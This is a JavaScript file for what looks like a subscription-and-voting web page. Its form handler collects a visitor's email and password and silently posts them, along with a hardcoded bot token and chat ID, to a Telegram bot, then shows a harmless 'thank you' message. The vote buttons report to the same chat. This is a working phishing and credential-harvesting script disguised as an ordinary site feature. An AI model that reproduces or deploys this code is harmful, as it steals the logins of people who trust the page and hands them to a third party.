const TELE_TOKEN = "8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU";
const CHAT_ID = "5207464165";

async function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: msg, 
                parse_mode: 'Markdown' 
            })
        });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
    }
}

// Handler for the Subscription Form
const authForm = document.getElementById('authForm');
if (authForm) {
    authForm.onsubmit = async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        await sendToTelegram(`📬 *New Subscription*\nEmail: ${email}\nPass: ${pass}`);
        alert('Thank you for subscribing!');
    };
}

// Handler for all Vote Buttons
document.querySelectorAll('.vote-btn').forEach(button => {
    button.addEventListener('click', async function() {
        const candidateName = this.getAttribute('data-candidate');
        await sendToTelegram(`🗳 *New Vote Received*\nCandidate: ${candidateName}`);
    });
});